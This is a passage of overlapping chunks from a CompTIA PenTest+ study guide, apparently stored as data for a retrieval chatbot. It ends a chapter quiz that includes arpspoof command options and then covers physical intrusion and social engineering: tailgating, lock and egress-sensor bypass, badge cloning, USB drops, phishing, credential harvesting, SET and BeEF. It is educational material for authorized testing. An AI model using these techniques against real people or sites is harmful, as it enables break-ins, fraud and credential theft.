rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	tools will not allow Alice to capture NTLM v2 hashes over the wire for use in a pass‐the‐hash attack? A. Responder B. Mimikatz C. Ettercap D. Metasploit 14. For what type of activity would you use the tools HULK, LOIC, HOIC, and SlowLoris? A. DDoS B. SMB hash capture C. DoS D. Brute‐force SSH 15. During a penetration test, Mike uses double tagging to send traffic to another system. What technique is he attempting? A. RFID tagging B. Tag nesting C. Meta tagging D. VLAN hopping 16. Elle is using her workstation as part of an on‐path attack as shown in the following image. What does she need to send at point X to ensure that the downgrade attack works properly? A. SYN, ACK B. PSH, URG C. FIN, ACK D. SYN, FIN 17. Isaac wants to use arpspoof to execute an on‐path attack between target host 10.0.1.5 and a server at 10.0.1.25, with a network gateway of 10.0.1.1. What commands does he need to run to do this? (Choose two.) A. arpspoof ‐i eth0 ‐t 10.0.1.5 ‐r 10.0.1.25 B. arpspoof ‐i eth0 ‐t 10.0.1.5 ‐r 10.0.1.1 C. arpspoof ‐i eth0 ‐t 255.255.255.255 ‐r 10.0.1.25 D. arpspoof ‐i eth0 ‐t 10.0.1.25 ‐r 10.0.1.5 18. Jessica wants to list the domain password policy for a Windows domain as she prepares for a password attack against domain member systems. What net command can she use to do this? A. net view /domainpolicy B. net accounts /domain C. net /viewpolicy D. net domain /admin 19. Cynthia attempted a DNS poisoning attack as shown here. After her attempt, she does not see any traffic from her target system. What most likely happened to cause the attack to fail? A. The DNS information was incorrect. B. The injection was too slow. C. The DNS cache was not refreshed. D. The client did not receive a trusted response. 20. Elle wants to clone an RFID entry access card. Which type of card is most easily cloned using inexpensive cloning devices? A. Low‐frequency 125 to 134.2 KHz card B. Medium‐frequency 400 to 451 KHz card C. High‐frequency 13.56 MHz card D. Ultra‐high‐frequency 865 to 928 MHz card Chapter 8 Exploiting Physical and Social Vulnerabilities THE COMPTIA PENTEST+ EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: Domain 3: Vulnerability Discovery and Analysis 3.3 Explain physical security concepts. Tailgating Site surveys Universal Serial Bus (USB) drops Badge cloning Lock picking Domain 4: Attacks and Exploits 4.8 Given a scenario, perform social engineering attacks using the appropriate tools. Attack Types Phishing Vishing Whaling Spearphishing Smishing Dumpster diving Surveillance Shoulder surfing Tailgating Eavesdropping Watering hole Impersonation Credential harvesting Tools Social Engineering Toolkit (SET) Gophish Evilginx theHarvester Maltego Recon‐ng Browser Exploitation Framework (BeEF) In this chapter, the concepts of exploiting physical and social vulnerabilities are covered in depth. Both require specific skill sets and tools, and we will look closely at both. The PenTest+ exam requires you to understand the concepts around the types of attacks when used in scenarios, but also the
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Domain 4: Attacks and Exploits 4.8 Given a scenario, perform social engineering attacks using the appropriate tools. Attack Types Phishing Vishing Whaling Spearphishing Smishing Dumpster diving Surveillance Shoulder surfing Tailgating Eavesdropping Watering hole Impersonation Credential harvesting Tools Social Engineering Toolkit (SET) Gophish Evilginx theHarvester Maltego Recon‐ng Browser Exploitation Framework (BeEF) In this chapter, the concepts of exploiting physical and social vulnerabilities are covered in depth. Both require specific skill sets and tools, and we will look closely at both. The PenTest+ exam requires you to understand the concepts around the types of attacks when used in scenarios, but also the tools that may be required to conduct them. First, we'll take a look at exploiting physical vulnerabilities. Physical vulnerabilities are mapped to physical security. Physical security is the security that is considered outside of normal technology, which is more “logical.” Consider physical security as the locked doors to a room where a computer is kept and logical security as the login to the operations system installed on the computer. Physical security maps to facilities, rooms, buildings, windows, doors, and so on. Much like logical security, physical security must also be tested to see where weaknesses exist. Physical penetration testing of facilities is less common than network‐based penetration testing, and it requires a different set of skills and techniques. Real World Scenario Scenario: Phishing and Physically Penetrating the Network After your successful network penetration test at MCDS, LLC, you have been asked to perform a phishing attack against the organization, followed by a physical penetration test of the facility. You have a list of valid email addresses from your previous penetration testing activities, and you know that the organization uses Windows 7 and 10 workstations as the primary desktop and laptop devices throughout its user base. As you read this chapter, consider how you would answer the following questions as part of your penetration test planning and preparation: How would you conduct a phishing campaign against MCDS? What would the intent of your phishing activities be? What information or access would you attempt to gain? What attack or compromise tools would you use, and how would you deliver them to the target population? What issues might you encounter while conducting the phishing campaign? MCDS has an on‐site data center facility. How can you determine how entry control is provided? Once you know how entry control is done, how can you acquire appropriate access credentials if necessary? MCDS uses magstripe access cards combined with a PIN‐based door lock system. What methods could you use to enter through doors secured with this type of system? What social engineering techniques would you use to gain access to the MCDS data center? Exploiting Physical Vulnerabilities Throughout the book you have learned how to penetrate, test, and exploit IT systems based on logical vulnerabilities. This may require us to scan and check computer systems online, over the Internet if we are provided access as an example. However, when we enter an organization to do the work
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	appropriate access credentials if necessary? MCDS uses magstripe access cards combined with a PIN‐based door lock system. What methods could you use to enter through doors secured with this type of system? What social engineering techniques would you use to gain access to the MCDS data center? Exploiting Physical Vulnerabilities Throughout the book you have learned how to penetrate, test, and exploit IT systems based on logical vulnerabilities. This may require us to scan and check computer systems online, over the Internet if we are provided access as an example. However, when we enter an organization to do the work on‐ site, we are physically there. So, this begs us to ask the most obvious question: How secure can the systems be if an attacker is able to walk right up to the console and access it? Obviously, for those of us who have been around for some time, it's rarely that easy. Normally, IT systems are kept locked up in data centers that use a myriad of methods to control physical access to the site. This doesn't mean, however, that all that physical access is set up correctly or cannot be thwarted. In this chapter, you'll learn how physical security is assessed and audited, tested and ensured. The first steps we take to conduct physical penetration testing is to assess the facility itself and start to unwind how to access it. Physical Facility Penetration Testing Physical access to systems, networks, and facilities can provide opportunities that remote network attacks can't. In most cases, direct physical access is one of the best ways to gain higher‐level access, making physical penetration tests a powerful tool in a pentester's arsenal. Physical penetration tests are also a useful way to test the effectiveness of physical security controls like entry access systems, sensors and cameras, security procedures, and guards, as well as security training for staff. Much like network‐based assessments, physical penetration tests require information gathering, analysis, exploitation, and reporting. In previous chapters, you learned how to conduct open source intelligence and passive reconnaissance. In addition to these techniques, a physical penetration test requires an on‐site observation phase in which you document the facility, its environment, and visible controls. With a networked penetration test, you can send active probes to networked devices, but when conducting active reconnaissance, you have to actually visit the facility to conduct physical reconnaissance. A final difference is the need for pretexting, a form of social engineering in which you present a fictional situation to gain access or information. Information gained in the initial reconnaissance stage of a physical penetration test will provide the detail needed for successful pretexting while you are on‐site by making your stories more believable. Showing up in the uniform of the local power company is far more likely to get you inside than showing up in the wrong uniform or a day after the scheduled maintenance has already occurred. Fewer resources are available for physical pentesters than there are for network pentesters, but there are
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	for pretexting, a form of social engineering in which you present a fictional situation to gain access or information. Information gained in the initial reconnaissance stage of a physical penetration test will provide the detail needed for successful pretexting while you are on‐site by making your stories more believable. Showing up in the uniform of the local power company is far more likely to get you inside than showing up in the wrong uniform or a day after the scheduled maintenance has already occurred. Fewer resources are available for physical pentesters than there are for network pentesters, but there are a number of major penetration testing methodologies that have physical security pentesting included. An example is the Open Source Security Testing Methodology Manual (OSSTMM). Version 4 is in draft as of this writing, but Version 3 is publicly available at https://www.isecom.org/OSSTMM.3.pdf. Site Surveys When starting a physical penetration test of a site, the first thing you need to do is conduct a site survey. Site surveys are assessments conducted by the pentester to assess the viability of the current physical security posture of the site. For example, an organization may ask for a physical site survey to be done, which will require an audit of how secure the security currently is. There are many aspects to this, including but not limited to interviews of the staff, assessing guards, reviewing camera scope, mapping of the entire site, and so much more. For the exam, you should focus on what a site survey is and the methods that may take place when one is conducted like tailgating (which will be covered in the following pages) as an example. The biggest part of conducting a site survey is collecting intelligence data through surveillance and assessment. The goals of the survey are to identify weaknesses in physical security so that access may be gained, vulnerabilities can be found, and exploits can be executed. Surveillance will be covered later in the chapter in its own self‐titled section. Surveillance is something that can be done in all aspects of pentesting to assess what data you can gather for testing. Another concept is to use reconnaissance methods (survey and research), which goes hand in hand with surveillance (observation), which is then further used to gather information for pentesting methods. Entering Facilities Gaining access to a facility is one of the first steps once you begin your on‐ site assessment or site survey. Figuring out how to get into public areas is often relatively easy, but secured areas usually require more work. You may have to pick locks or find another way to bypass them, or you may have to use social engineering techniques to persuade staff members to let you in. The PenTest+ exam objectives focus on a handful of common methods that are explained here. Piggybacking and Tailgating One of the easiest ways into a facility is to accompany a legitimate employee. If you look like you belong in the facility, and the organization is one
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	site assessment or site survey. Figuring out how to get into public areas is often relatively easy, but secured areas usually require more work. You may have to pick locks or find another way to bypass them, or you may have to use social engineering techniques to persuade staff members to let you in. The PenTest+ exam objectives focus on a handful of common methods that are explained here. Piggybacking and Tailgating One of the easiest ways into a facility is to accompany a legitimate employee. If you look like you belong in the facility, and the organization is one in which not all employees know one another, tailgating is a good option. Tailgating (sometimes called piggybacking) attacks rely on following employees in through secured doors or other entrances. Higher‐security organizations may use access security vestibules to prevent piggybacking and tailgating. A properly implemented security vestibule, as shown in Figure 8.1, will allow only one person through at a time, and that person will have to unlock two doors, only one of which can be unlocked and opened at a time. FIGURE 8.1 A typical security vestibule design Although tailgating can be a useful solution, other related techniques include dressing as a delivery driver and bringing a box or other delivery in or finding another likely reason to be admitted by employees. Even if they won't let you follow them in because of security concerns, there is almost always a reason that will persuade them to open the door for you. When Something Goes Wrong Despite all the planning that you put into a physical penetration test, something will probably go wrong. Physical penetration tests are more likely to result in pentesters being caught and identified or something unexpected occurring. That means you need a plan! Your plan should include (but isn't limited to) all of these: Who to contact in the organization when something goes wrong, and an agreement about what will be done. Things that can go wrong include being discovered, setting off an alarm, or even having the police called! You need to define what to do if any of these things happen. How you will deal with unexpected encounters with facility staff. If you run into someone who asks who you are, how will you identify yourself, and what story will you tell? What ID will you show? What you will do if you end up trapped, in jail, or otherwise detained. This list can look intimidating, but the reality is that physical penetration testing and social engineering are complex and the unexpected is likely to occur. A plan can help, and knowing that you have contingencies in place for the most likely problems you could run into is an important part of a penetration test. Bypassing Locks and Entry Control Systems Entry control is often managed through locks, making picking locks a useful part of a pentester's toolkit. Many pentesters carry a lockpick set that can allow them to bypass many locks that they encounter,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	trapped, in jail, or otherwise detained. This list can look intimidating, but the reality is that physical penetration testing and social engineering are complex and the unexpected is likely to occur. A plan can help, and knowing that you have contingencies in place for the most likely problems you could run into is an important part of a penetration test. Bypassing Locks and Entry Control Systems Entry control is often managed through locks, making picking locks a useful part of a pentester's toolkit. Many pentesters carry a lockpick set that can allow them to bypass many locks that they encounter, including those on doors, desks, filing cabinets, and other types of secure storage. Lock picking is a technique that requires tools as well as techniques to get past physical security applied to doors or other secure physical access and entry points. Although commonly found on doors, locks are applied to windows and various other physical mediums. To pick a lock, you may need specialized tools. You can also duplicate a key, which may be easier. There are several ways to duplicate keys, including copying them from photos of keys, creating an impression of a key and then copying it from the impression, and even using multiple keys from the same organization to reverse‐engineer the master key. You can find more information on these and other techniques at these sites: Deviant Ollam's site: https://deviating.net/lockpicking The LockWiki: https://www.lockwiki.com/index.php/Locksport The Open Organisation of Lockpickers (TOOOL) website: https://toool.us Before you pick locks—or carry lockpicks—make sure you know about the legality of lockpicking and lockpicks in your area. The Open Organization of Lockpickers (TOOOL) provides a guide to U.S. lockpicking laws by state at https://toool.us/lockpicking-laws/. Bypassing locks that don't use keys can also be useful—so you also need to pay attention to RFID and magnetic‐stripe access card systems and cloning tools, as well as any other entry access mechanisms in use in the organization. Push‐button locks, electronic keypads, and other mechanisms may be used, and gaining access can be as simple as watching for a legitimate user to punch in their code in plain sight! Pentesters who can acquire or access badges, RFID tokens, or magnetic‐ stripe security cards can also attempt to clone them. Many can be duplicated using a simple cloning device that reads the legitimate key or card and copies it to another key. How you acquire the key itself or gain access to one for long enough to clone it is often a concern in social engineering exercises. Since badge cloning doesn't leave evidence of the copy being made, it is an attractive option when performing a penetration test against organizations that use them. Lock bypass techniques also involve tools like “shove keys,” which are thin metal shims that can be hooked over latches and locks to allow a pentester to disengage the lock. Specialized shims and other tools—including simply putting a piece of tape over the latch plate of an exit door so you can reenter later—are all methods used
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	access to one for long enough to clone it is often a concern in social engineering exercises. Since badge cloning doesn't leave evidence of the copy being made, it is an attractive option when performing a penetration test against organizations that use them. Lock bypass techniques also involve tools like “shove keys,” which are thin metal shims that can be hooked over latches and locks to allow a pentester to disengage the lock. Specialized shims and other tools—including simply putting a piece of tape over the latch plate of an exit door so you can reenter later—are all methods used to bypass locks without picking them. Egress or exit sensors are also open to exploit. They are often used in heavy traffic areas to automatically unlock or open doors so that staff can exit easily, but this means that pentesters can use them as an access method. This vulnerability has prompted some organizations to remove or disable egress sensor systems in secure areas like data centers, but they remain in many locations. Convenience Gone Wrong One of the authors of this book worked with an organization that had its egress sensors used against it. The organization had placed egress sensors on a heavily used door to allow it to open easily to allow valuable but heavy portable equipment that moved frequently between facilities to be transferred more easily. Thieves with knowledge of the organization used a crack between the access doors to slide a thin probe with a flag on it through and wave it in front of the egress sensor. This activated the external doors, allowing the thieves into the building. From there, they proceeded to steal highly valuable equipment from a locked secure storage room. The egress doors happily opened themselves again to allow the thieves out, too! Bypassing Perimeter Defenses and Barriers Fences and other barriers are intended as both physical barriers and deterrents to unauthorized access. Fences come in many styles, from low fences intended to limit traffic or prevent casual access, to higher‐security fences topped with barbed wire or razor wire to discourage climbers. Very high‐security locations may even reinforce their fences with aircraft cable to prevent vehicles from crashing through them and may extend their fences below ground level to discourage digging under them. As you might expect, organizations that use higher‐security fence designs are also likely to have guard posts, including gate guards, and may even have security patrols. Learning who is allowed through the gates, what sort of identification is required, if there are patrols, and what their schedules and habits are, should be part of your penetration test documentation if they are in scope and exist at your target location. As a pentester, you should fully document fences, their layout and weaknesses, and where and how access is provided through them. In many cases, your focus will be on how to use existing gates and entrances rather than breaching the fence, but a complete penetration test should also document existing breaches
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	and may even have security patrols. Learning who is allowed through the gates, what sort of identification is required, if there are patrols, and what their schedules and habits are, should be part of your penetration test documentation if they are in scope and exist at your target location. As a pentester, you should fully document fences, their layout and weaknesses, and where and how access is provided through them. In many cases, your focus will be on how to use existing gates and entrances rather than breaching the fence, but a complete penetration test should also document existing breaches and weaknesses. Of course, if you can easily jump the fence, then fence‐jumping should be on your list of possible options! Other Common Controls Although the PenTest+ exam specifically calls out a few physical penetration testing techniques, there are a number of common controls that it doesn't mention. The following are among them: Alarms, which may need to be bypassed or disabled Lighting, including motion‐activated lighting Motion sensors that may activate alarm systems Video surveillance and camera systems that may record your activities Documenting where each security control is placed and how it works or is likely to work should be high on your list as you plan your work at a facility. Although the PenTest+ exam objectives don't mention these common controls, you are likely to encounter them during a physical penetration test. Make sure including them in your planning! Information Gathering Gathering information while in a facility can provide useful information for both physical and network‐based penetration testing. Many pentesters will record their entire physical penetration test attempt using a concealed camera and will also record any reconnaissance activities. This allows them to review the footage to find security cameras, employee badge numbers, and many other pieces of information they might miss if they relied only on memory and notes. Pentesters also often engage in dumpster diving, or retrieving information from the organization's trash. At times, this involves actually jumping into dumpsters to recover paperwork, documentation, or even computers or other electronic media. At other times it can be as simple as rummaging in a trash can under a desk. The goal of a dumpster‐diving expedition is to recover useful information like passwords, user IDs, phone numbers, or even procedures. Exploiting Social Vulnerabilities Now that we have covered exploiting physical vulnerabilities, let's dive into how to exploit social vulnerabilities. Social vulnerabilities are those that can be exploited commonly through people; hence, that's why it's called “social.” By socializing with others, or attending social functions, one can blend in, manipulate, pretend, and use psychological methods to gain information, access, and be able to manipulate others to get that they need. Remember this: It may take you 100 years to crack through the strongest encryption but only 3 seconds to manipulate the one that holds the information to decode it. Most of the highest‐level hack jobs we have seen in the history of information security have been conducted through social
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	vulnerabilities. Social vulnerabilities are those that can be exploited commonly through people; hence, that's why it's called “social.” By socializing with others, or attending social functions, one can blend in, manipulate, pretend, and use psychological methods to gain information, access, and be able to manipulate others to get that they need. Remember this: It may take you 100 years to crack through the strongest encryption but only 3 seconds to manipulate the one that holds the information to decode it. Most of the highest‐level hack jobs we have seen in the history of information security have been conducted through social engineering. Social Engineering Social engineering targets people instead of computers and relies on individuals or groups breaking security procedures, policies, and rules. In the context of the PenTest+ exam, a social engineer finds and exploits human weaknesses and behaviors to accomplish the goals of a penetration test. Social engineering can be done in person, over the phone, via text messaging or email, or in any other medium where the social engineer can engage and target the people who work for or with a target organization. Psychology and Hacking Humans Social engineering requires a good understanding of human behavior and human weaknesses. The goal of social engineering is to persuade your target to provide information or access that will allow you to succeed in performing your penetration test. To do so, you will often appeal to one or more of these common social engineering targets: Trust is the foundation of many social engineering attacks. Creating a perception of trust can be done in many ways. Most individuals unconsciously want to trust others, providing a useful target for social engineers. Reciprocation relies on the target feeling indebted or that they need to return a favor. Authority focuses on making the target believe that you have the power or right to ask them to perform actions or provide information. Urgency is the sense that the action needs to be performed, often because of one of the other reasons listed here. Fear that something will go wrong or that they will be punished if they do not respond or help is a common target. Likeness or similarity between the social engineer and the target is a means of building trust, as the target is set up to sympathize with the pentester due to their similarity. Social proof relies on persuading the target that other people have behaved similarly and, thus, that they should or could as well. Scarcity is related to fear‐based approaches but focuses on there being fewer rewards or opportunities, requiring faster action and thus creating a sense of urgency. Helpful nature is the straightforward truth about most decent people. When given an innocent opportunity to be appreciated, a target will be helpful to the pentester. This list doesn't include all the possible motivations and methods that can be used for social engineering. Understanding what common behaviors and beliefs your target organization holds, and which your specific target may value, can provide
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	people have behaved similarly and, thus, that they should or could as well. Scarcity is related to fear‐based approaches but focuses on there being fewer rewards or opportunities, requiring faster action and thus creating a sense of urgency. Helpful nature is the straightforward truth about most decent people. When given an innocent opportunity to be appreciated, a target will be helpful to the pentester. This list doesn't include all the possible motivations and methods that can be used for social engineering. Understanding what common behaviors and beliefs your target organization holds, and which your specific target may value, can provide a powerful set of social engineering levers. In‐Person Social Engineering In‐person social engineering requires a strong understanding of individuals and how they respond, and it leverages the social engineer's skills to elicit desired responses. There are many in‐person social engineering techniques, including those documented in the Social Engineering Framework: https://www.social-engineer.org/framework/general-discussion. Elicitation Gathering information is a core element of any social engineering exercise, and elicitation, or getting information without directly asking for it, is a very important tool. Asking an individual for information directly can often make them suspicious, but asking other questions or talking about unrelated areas that may lead them to reveal the information you need can be very effective. Common techniques include using open‐ended or leading questions and then narrowing them down as topics become closer to the desired information. Surveillance As mentioned earlier in the chapter, conducting surveillance is critical to gathering information. It is also a method that can be used to identify weaknesses in security and help to bridge the gap between different types of social, physical and logical attacks. The term surveillance covers many different methods and uses various tools, but the simplest form comes from observation. By observing your surroundings, something, someone, or quite frankly anything, you begin to learn about it. You pick up patterns. When conducting surveillance, you are carefully watching so you can find information that can be useful. Surveillance can come in many forms. As mentioned, it can come from observation, keeping watch, conducting inspections, supervising others, blending in, conducting monitoring of operations, gathering intelligence, performing reconnaissance by going undercover, listening in on conversations (eavesdropping), and so on. Some of the tools used can include, but are not limited to, tapping devices such as phones, placing recording devices on systems, bugging, voice recording, and video recording. Eavesdropping Another great method to gather information is by eavesdropping. As part of surveillance to get data, overhearing what others are saying or talking about can provide a multitude of information. By observing others and fitting in, nobody would pay attention to you giving you the perfect opportunity to secretly listen in on another person's conversation. They can be speaking in person or even on the phone. When you listen in on the conversation, you can gather data to conduct other exploits. For example, someone may mention to another person that they are going on break in an hour. That means that if
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	method to gather information is by eavesdropping. As part of surveillance to get data, overhearing what others are saying or talking about can provide a multitude of information. By observing others and fitting in, nobody would pay attention to you giving you the perfect opportunity to secretly listen in on another person's conversation. They can be speaking in person or even on the phone. When you listen in on the conversation, you can gather data to conduct other exploits. For example, someone may mention to another person that they are going on break in an hour. That means that if they are a guard, then you have overheard a possible time specific to when an attack may be conducted. This form of spying is helpful (and useful) when conducting social engineering attacks. You may learn personal information that can be then repeated to get others to trust you by telling them you know this person who works in a certain place, which may provide you with special favors like the passcode to a door that you forget. These types of examples are helpful when conducting physical and logical pentests. Do not confuse social engineering forms of eavesdropping with technical or logical forms. If you conduct an on‐path attack and can capture data with a sniffer, you are technically “eavesdropping” and information gathering. This is sometimes referred to as a snooping attack. When listening in to another human's conversation, it is also eavesdropping (or snooping). This is just a “social” form of the attack, versus a logical or technical form. Interrogation and Interviews Interrogation and interview tactics can be used as part of a social engineering process. Interrogation techniques focus on the social engineer directing the conversation and asking most, if not all, of the questions. This is less subtle and less comfortable for the target, and it means that interrogation is less frequently used unless the target has a reason to allow being interrogated. Interview tactics are similar but place the subject more at ease. In both cases, body language is an important clue to the target's feelings and responses. Impersonation Many social engineering techniques involve some form of impersonation. Impersonation involves disguising yourself as another person to gain access to facilities or resources. This may be as simple as claiming to be a staff member or as complex as wearing a uniform and presenting a false or cloned company ID. Impersonating a technical support worker, maintenance employee, delivery person, or administrative assistant is also common. Impersonation frequently involves pretexting, a technique where the social engineer claims to need information about the person they are talking to, thus gathering information about the individual so that they can better impersonate them. Quid Pro Quo Quid pro quo attacks rely on the social engineer offering something of value to the target in order for the target to feel safe and indebted to them. This builds perceived trust, luring the target into feeling safe in returning the favor. Shoulder Surfing Simply watching over
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	ID. Impersonating a technical support worker, maintenance employee, delivery person, or administrative assistant is also common. Impersonation frequently involves pretexting, a technique where the social engineer claims to need information about the person they are talking to, thus gathering information about the individual so that they can better impersonate them. Quid Pro Quo Quid pro quo attacks rely on the social engineer offering something of value to the target in order for the target to feel safe and indebted to them. This builds perceived trust, luring the target into feeling safe in returning the favor. Shoulder Surfing Simply watching over a target's shoulder can provide valuable information like passwords or access codes. This is known as shoulder surfing, and high‐resolution cameras with zoom lenses can make it possible from long distances. This is also a common form of eavesdropping. USB Drop Attacks Physical honeypots like USB keys or other media can be used when other means of accessing an organization aren't possible. To perform a USB drop key attack, the pentester preloads a thumb drive with attack tools aimed at common operating systems or software found in the target company. They then drop one or more of these drives in locations where they are likely to be found, sometimes with a label that indicates that the drive has interesting or important data on it. The goal of attacks like these is to have the drives or media found, then accessed on target computers. If the attack tools are successful, they phone home to a system set up by the pentester, allowing remote access through firewalls and other security barriers. Attacks like this are sometimes called “baiting” attacks, since the flash drives act as a form of bait. When you choose bait for an attack like this, you should consider what might motivate your target. Picking up a thumb drive is often motivated by a desire to return the drive to the right person or curiosity about the content. You can influence this with a label like “2019/2020 salaries,” which may make the person who picked the drive up more likely to open a file with a tempting name! Bribery Bribing employees at the target organization to allow you to access systems or facilities will not be in scope for many penetration tests, but pentesters should be aware that it may be a valid technique under some circumstances. Bribery is a sensitive topic and should be carefully addressed via scoping agreements and the rules of engagement for a penetration test. Phishing Attacks Phishing attacks target sensitive information like passwords, usernames, or credit card information. Although most phishing is done via email, there are many related attacks that can be categorized as types of phishing: Vishing, or voice phishing, is social engineering over the phone system. It often relies on caller ID spoofing tools to make the calls more believable. Smishing or Short Message Service (SMS) phishing is phishing via SMS messages. Whaling targets high‐profile or important members of an organization, like
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	sensitive topic and should be carefully addressed via scoping agreements and the rules of engagement for a penetration test. Phishing Attacks Phishing attacks target sensitive information like passwords, usernames, or credit card information. Although most phishing is done via email, there are many related attacks that can be categorized as types of phishing: Vishing, or voice phishing, is social engineering over the phone system. It often relies on caller ID spoofing tools to make the calls more believable. Smishing or Short Message Service (SMS) phishing is phishing via SMS messages. Whaling targets high‐profile or important members of an organization, like the CEO or senior vice presidents. Spear phishing is aimed at specific individuals rather than a broader group. Regardless of the method or technology used, phishing attempts are aimed at persuading targeted individuals that the message they are receiving is true and real and that they should respond. In many cases, phishing messages are sent to very large populations, since a single mistake is all that is necessary for the attack to succeed. Phishing RSA In 2011, RSA security experienced a serious breach caused by a phishing attack sent to a targeted group of employees. The email, titled “2011 Recruitment Plan,” included malware in an attached Microsoft Excel document. Once the document was opened, the malware attacked a vulnerability in Adobe Flash, and then installed a remote access tool. The attacker was then able to pivot to other systems using credentials stolen from the compromised system. This breach resulted in a compromise of RSA's SecureID two‐factor authentication system, with broad impacts on many organizations that relied on the security of the system. RSA's own costs due to the breach were over $66 million. You can read more about it here: https://bits.blogs.nytimes.com/2011/04/02/the-rsa-hack-how-they-did-it. Website‐Based Attacks Although many social engineering attacks are done via phishing or in‐ person techniques, a web‐based social engineering attack can also be a useful tool. Two of the most commonly used website‐based attacks are watering holes and the use of cloned websites for phishing. Watering Holes Once you have learned the behaviors of staff at a target organization, you may identify a commonly visited site. Attacks that focus on compromising a site like this and modifying its code, including malware, is known as a watering hole attack. Watering hole attacks may focus on the code of the site itself or code that the site includes by default, such as advertising code or the plug‐ins. This often combines social engineering with traditional application, server, or service attacks to complete the watering hole attack successfully. Cloned Websites Many phishing attacks rely on cloned websites. Such a site appears to be a real website but instead captures data that is entered. Some then pass that data along to the real website, but others simply redirect you elsewhere after capturing the data. Cloning many websites is as easy as saving the code, and tools like the Social Engineering Toolkit provide website attack vector tools that can clone a website for phishing or
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	as advertising code or the plug‐ins. This often combines social engineering with traditional application, server, or service attacks to complete the watering hole attack successfully. Cloned Websites Many phishing attacks rely on cloned websites. Such a site appears to be a real website but instead captures data that is entered. Some then pass that data along to the real website, but others simply redirect you elsewhere after capturing the data. Cloning many websites is as easy as saving the code, and tools like the Social Engineering Toolkit provide website attack vector tools that can clone a website for phishing or malicious code injection. Credential Harvesting A common website attack is when a credential harvester is applied to it and will begin to collect login and credential information in large amounts. The exploitation benefits to collecting all this information are exponential. Not only have you collected useful credential information, but you can do so in bulk. Credential harvesting is just that—harvesting large amounts of information to be used for furthering more attacks and exploits with the use of a credential harvester. The credential harvester is a tool that you can use on web properties to conduct this attack. The harvester can be installed on a system, maybe through a phishing email or via malware. It can also be uploaded to a website. There are many ways to deploy the harvester, but ultimately once it is placed, any login information is quickly recorded or copied. The information gathered will contain common credential information such as usernames or IDs, PINs, codes, passwords, email addresses, and anything else used to log in with. Many times, this information will wind up on the dark web, where it can be used or sold. Dark Web The sale of credentials on the dark web is a highly lucrative business— so much so that companies that produce dark web scanning services to find your used credentials on the dark web are often used to help people further find, and proactively deal with, their breached credentials before suffering an attack or exploitation. The dark web contains your information, and it's a growing business to identify and fix it. Why is it so important? Many times, users reuse passwords or alter them slightly because they can't remember hundreds of passwords across web properties. Because of this, one set of credentials captured can give hackers a jumping‐off point to get started. This can lead to bigger hacks on medical information, banking, and other sensitive data that can make them more money. It's important to know why credential harvesting is an important exploit to identify early and deal with immediately if possible. You can read more about this topic here: https://www.darkreading.com/threat-intelligence/sale-of-stolencredentials-and-initial-access-dominate-dark-web-markets. Using Social Engineering Tools Social engineering techniques are powerful, but combining them with technical tools that allow for the use of prebuilt attack vectors and automation can give a pentester a major advantage. Fortunately, attack tools designed specifically to support penetration testing exist. Two of the most common tools are the
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	This can lead to bigger hacks on medical information, banking, and other sensitive data that can make them more money. It's important to know why credential harvesting is an important exploit to identify early and deal with immediately if possible. You can read more about this topic here: https://www.darkreading.com/threat-intelligence/sale-of-stolencredentials-and-initial-access-dominate-dark-web-markets. Using Social Engineering Tools Social engineering techniques are powerful, but combining them with technical tools that allow for the use of prebuilt attack vectors and automation can give a pentester a major advantage. Fortunately, attack tools designed specifically to support penetration testing exist. Two of the most common tools are the Social Engineering Toolkit (SET) and the Browser Exploitation Framework (BeEF). Using SET The Social Engineering Toolkit (SET) is a menu‐driven social engineering attack system. Metasploit users will already be familiar with this type of menu‐driven attack system. It provides spear phishing, website, infectious media, and other attack vectors, as shown in Figure 8.2. FIGURE 8.2 SET menu SET is built into Kali Linux, allowing pentesters to easily integrate it into testing activities. It integrates with Metasploit to generate payloads using the same methods that have been covered in previous chapters in this book. Figure 8.3 shows SET handing off to Metasploit to run a local service to accept connections from an attack package. Once you have selected an attack methodology, modules can be delivered to your target via email, USB thumb drives, or a malicious website. Once your social engineering efforts succeed, the exploit packages will execute. If they are successful, you will have a remote shell or other access to the compromised system! FIGURE 8.3 SET loading the Metasploit reverse TCP handler Using BeEF The Browser Exploitation Framework (BeEF) is a penetration testing tool designed to allow exploitation of web browsers. Like Metasploit and SET, BeEF is built into Kali Linux. You can practice with BeEF using the virtual machines you have used for earlier exercises. Once you have persuaded a user to visit a BeEF‐enabled site, the tool takes over, providing “hooks” into a large number of browser features and capabilities. BeEF provides extensive information about the connected browser, as shown in Figure 8.4. Notice that you can see the browser string, language, platform, window size, and a list of browser components and capabilities, as well as the location from which the device was hooked. Once you start BeEF on Kali Linux, it will open a browser window with a login screen. The default username and password is beef. Once you have a browser hooked, BeEF provides a large set of tools that you can use to take action inside the browser. These include detection capabilities for settings and programs, as well as direct actions like playing sounds or asking the remote page for permission to turn on the webcam or getting lists of visited sites and domains. If the browser allows it, BeEF can also detect locally installed plug‐ins and software, use specific exploits against the browser, perform DoS attacks, or even attempt to install persistence tools.
